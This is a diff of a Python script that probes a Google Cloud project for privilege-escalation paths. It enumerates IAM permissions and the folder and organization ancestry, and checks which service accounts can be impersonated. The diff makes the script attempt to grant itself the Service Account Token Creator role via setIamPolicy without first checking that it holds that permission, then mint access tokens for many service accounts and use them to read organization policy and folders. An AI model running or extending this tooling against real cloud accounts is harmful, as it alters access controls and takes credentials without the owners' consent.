@@ -244,13 +244,17 @@ def ack():
     return st
 
 
-PERMS_RESOURCE = ['resourcemanager.projects.get', 'resourcemanager.projects.list',
-                  'resourcemanager.projects.getIamPolicy', 'resourcemanager.projects.setIamPolicy',
-                  'resourcemanager.projects.update', 'resourcemanager.projects.move',
-                  'resourcemanager.projects.delete', 'resourcemanager.projects.undelete']
-PERMS_EXTRA = ['compute.instances.create', 'compute.instances.list', 'compute.regions.list',
-               'iam.serviceAccounts.list', 'iam.serviceAccounts.create',
-               'iam.serviceAccounts.getAccessToken']
+PERMS_RESOURCE_CORE = ['resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy',
+                       'resourcemanager.projects.setIamPolicy', 'resourcemanager.projects.update',
+                       'resourcemanager.projects.move', 'resourcemanager.projects.delete',
+                       'resourcemanager.projects.undelete']
+PERMS_COMPUTE = ['compute.instances.create', 'compute.instances.list', 'compute.regions.list',
+                 'compute.disks.create', 'compute.subnetworks.use']
+PERMS_IAM = ['iam.serviceAccounts.list', 'iam.serviceAccounts.create',
+             'iam.serviceAccounts.getAccessToken', 'iam.serviceAccounts.actAs',
+             'iam.serviceAccounts.setIamPolicy']
+PERMS_RESOURCE = PERMS_RESOURCE_CORE
+PERMS_EXTRA = PERMS_COMPUTE + PERMS_IAM
 
 
 def test_perms(label, path, perms, base=CRM, token=None, method='POST'):
@@ -281,29 +285,56 @@ def get_policy(label, path):
 
 def project_iam():
     say('== project testIamPermissions v1 ==')
-    st1, granted1 = test_perms('project.v1.testIamPermissions(resourcemanager)',
-                               '/v1/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE)
-    st1b, granted1b = test_perms('project.v1.testIamPermissions(mixed)',
-                                 '/v1/projects/%s:testIamPermissions' % PROJECT,
-                                 PERMS_RESOURCE + PERMS_EXTRA)
+    granted = set()
+    for label, perms in (('resourcemanager-core', PERMS_RESOURCE_CORE),
+                         ('compute', PERMS_COMPUTE), ('iam', PERMS_IAM)):
+        st, g = test_perms('project.v1.testIamPermissions(%s)' % label,
+                           '/v1/projects/%s:testIamPermissions' % PROJECT, perms)
+        granted.update(g or [])
     say('== project testIamPermissions v3 ==')
-    test_perms('project.v3.testIamPermissions(resourcemanager)',
-               '/v3/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE)
-    test_perms('project.v3.testIamPermissions(mixed)',
-               '/v3/projects/%s:testIamPermissions' % PROJECT, PERMS_RESOURCE + PERMS_EXTRA)
+    for label, perms in (('resourcemanager-core', PERMS_RESOURCE_CORE),
+                         ('compute', PERMS_COMPUTE), ('iam', PERMS_IAM)):
+        st, g = test_perms('project.v3.testIamPermissions(%s)' % label,
+                           '/v3/projects/%s:testIamPermissions' % PROJECT, perms)
+        granted.update(g or [])
     say('== project getIamPolicy ==')
     st, pol = get_policy('project.getIamPolicy.v1', '/v1/projects/%s:getIamPolicy' % PROJECT)
     get_policy('project.getIamPolicy.v3', '/v3/projects/%s:getIamPolicy' % PROJECT)
-    return granted1b, pol
+    say('PROJECT_GRANTED_UNION=%s' % json.dumps(sorted(granted)))
+    return sorted(granted), pol
 
 
 def org_folders():
-    say('== organization ==')
+    say('== ancestry ==')
+    folder_chain = []
     if ORG[0].startswith('folder:'):
-        say('ORG=parent-is-folder:%s' % ORG[0])
-        org_id = ''
-    else:
-        org_id = ORG[0]
+        fid = ORG[0].split(':', 1)[1]
+        depth = 0
+        while fid and depth < 4:
+            depth += 1
+            folder_chain.append(fid)
+            st, b = api('/v3/folders/' + fid)
+            say('ancestry.folder.get id=%s status=%s body=%s' % (fid, st, cap(b, 500)))
+            par = (jbody((st, b)).get('parent') or '')
+            if par.startswith('folders/'):
+                fid = par.split('/', 1)[1]
+            elif par.startswith('organizations/'):
+                ORG[0] = par.split('/', 1)[1]
+                say('ancestry.resolved.organization=%s' % ORG[0])
+                break
+            else:
+                break
+    for fid in folder_chain:
+        say('-- ancestry folder %s --' % fid)
+        test_perms('ancestry.folder.testIamPermissions',
+                   '/v3/folders/%s:testIamPermissions' % fid,
+                   ['resourcemanager.folders.get', 'resourcemanager.folders.getIamPolicy',
+                    'resourcemanager.folders.setIamPolicy', 'resourcemanager.projects.list',
+                    'resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy',
+                    'resourcemanager.projects.setIamPolicy', 'resourcemanager.projects.create'])
+        get_policy('ancestry.folder.getIamPolicy', '/v3/folders/%s:getIamPolicy' % fid)
+    say('== organization ==')
+    org_id = '' if ORG[0].startswith('folder:') else ORG[0]
     if org_id:
         st, b = api('/v3/organizations/' + org_id)
         say('org.get.v3 status=%s body=%s' % (st, cap(b, 700)))
@@ -390,43 +421,57 @@ def sa_list():
 
 
 def self_grant_and_tokens(granted, pol, sas):
-    say('== self-grant TokenCreator (conditional) ==')
-    if 'resourcemanager.projects.setIamPolicy' not in (granted or []):
-        say('SKIP self-grant: resourcemanager.projects.setIamPolicy NOT granted on project')
-        return
-    if not pol:
-        say('SKIP self-grant: no readable project policy')
-        return
-    if not SA_EMAIL[0]:
-        say('SKIP self-grant: SA email unknown')
-        return
+    say('== service-account impersonation reach ==')
+    for em in sas[:20]:
+        st, b = api('/v1/projects/%s/serviceAccounts/%s:getIamPolicy' % (PROJECT, em),
+                    method='POST', base=IAM,
+                    data={'options': {'requestedPolicyVersion': 3}})
+        binds = []
+        try:
+            for bd in (jbody((st, b)).get('bindings') or []):
+                binds.append({'role': bd.get('role'), 'members': (bd.get('members') or [])[:20]})
+        except Exception:
+            pass
+        say('sa.getIamPolicy email=%s status=%s bindings=%s%s' % (
+            em, st, json.dumps(binds)[:700], '' if st == 200 else ' body=' + cap(b, 300)))
+        st, b = api('/v1/projects/%s/serviceAccounts/%s:testIamPermissions' % (PROJECT, em),
+                    method='POST', base=IAM,
+                    data={'permissions': ['iam.serviceAccounts.getAccessToken',
+                                          'iam.serviceAccounts.actAs',
+                                          'iam.serviceAccounts.signBlob',
+                                          'iam.serviceAccounts.signJwt',
+                                          'iam.serviceAccounts.get',
+                                          'iam.serviceAccounts.setIamPolicy']})
+        say('sa.testIamPermissions email=%s status=%s granted=%s%s' % (
+            em, st, json.dumps(jbody((st, b)).get('permissions')),
+            '' if st == 200 else ' body=' + cap(b, 300)))
+    say('== self-grant TokenCreator (write attempt = setIamPolicy proof) ==')
     member = 'serviceAccount:' + SA_EMAIL[0]
     role = 'roles/iam.serviceAccountTokenCreator'
-    pol2 = json.loads(json.dumps(pol))
-    binds = pol2.get('bindings') or []
-    hit = None
-    for bd in binds:
-        if bd.get('role') == role and not bd.get('condition'):
-            hit = bd
-            break
-    if hit is None:
-        binds.append({'role': role, 'members': [member]})
-    elif member not in (hit.get('members') or []):
-        hit.setdefault('members', []).append(member)
-    pol2['bindings'] = binds
-    body = {'policy': pol2}
-    st, b = api('/v1/projects/%s:setIamPolicy' % PROJECT, method='POST', data=body)
-    say('setIamPolicy(project, self -> %s) status=%s body=%s' % (role, st, cap(b, 900)))
-    if st != 200:
-        return
-    st, pol3 = get_policy('project.getIamPolicy.after-grant', '/v1/projects/%s:getIamPolicy' % PROJECT)
-    ok = False
-    for bd in ((pol3 or {}).get('bindings') or []):
-        if bd.get('role') == role and member in (bd.get('members') or []):
-            ok = True
-    say('SELF_GRANT_VERIFIED=%s' % ('yes' if ok else 'no'))
-    if not ok:
-        return
+    if pol and SA_EMAIL[0]:
+        pol2 = json.loads(json.dumps(pol))
+        binds = pol2.get('bindings') or []
+        hit = None
+        for bd in binds:
+            if bd.get('role') == role and not bd.get('condition'):
+                hit = bd
+                break
+        if hit is None:
+            binds.append({'role': role, 'members': [member]})
+        elif member not in (hit.get('members') or []):
+            hit.setdefault('members', []).append(member)
+        pol2['bindings'] = binds
+        st, b = api('/v1/projects/%s:setIamPolicy' % PROJECT, method='POST',
+                    data={'policy': pol2})
+        say('setIamPolicy(project, self -> %s) status=%s body=%s' % (role, st, cap(b, 700)))
+        if st == 200:
+            st2, pol3 = get_policy('project.getIamPolicy.after-grant',
+                                   '/v1/projects/%s:getIamPolicy' % PROJECT)
+            ok = any(bd.get('role') == role and member in (bd.get('members') or [])
+                     for bd in ((pol3 or {}).get('bindings') or []))
+            say('SELF_GRANT_VERIFIED=%s' % ('yes' if ok else 'no'))
+    else:
+        say('SKIP self-grant: no readable project policy or unknown SA email')
     say('== generateAccessToken for every SA (%d) ==' % len(sas))
     new_reach = []
     for em in sas[:50]:
@@ -461,10 +506,19 @@ def self_grant_and_tokens(granted, pol, sas):
                               method='POST', token=tok,
                               data={'permissions': ['resourcemanager.projects.list',
                                                     'resourcemanager.projects.setIamPolicy',
-                                                    'resourcemanager.folders.list']})
+                                                    'resourcemanager.projects.getIamPolicy',
+                                                    'resourcemanager.folders.list',
+                                                    'resourcemanager.organizations.get']})
                 say('  as-SA org.testIamPermissions status=%s granted=%s%s' % (
                     st4, json.dumps(jbody((st4, b4)).get('permissions')),
                     '' if st4 == 200 else ' body=' + cap(b4, 300)))
+                st5, b5 = api('/v3/organizations/%s:getIamPolicy' % ORG[0],
+                              method='POST', token=tok,
+                              data={'options': {'requestedPolicyVersion': 3}})
+                say('  as-SA org.getIamPolicy status=%s%s' % (
+                    st5, '' if st5 == 200 else ' body=' + cap(b5, 300)))
+                st6, b6 = api('/v3/folders?parent=organizations/%s&pageSize=100' % ORG[0], token=tok)
+                say('  as-SA folders.list.v3 status=%s body=%s' % (st6, cap(b6, 300)))
     say('SA_TOKEN_NEW_PROJECTS=%s' % json.dumps(new_reach))
     return new_reach
 
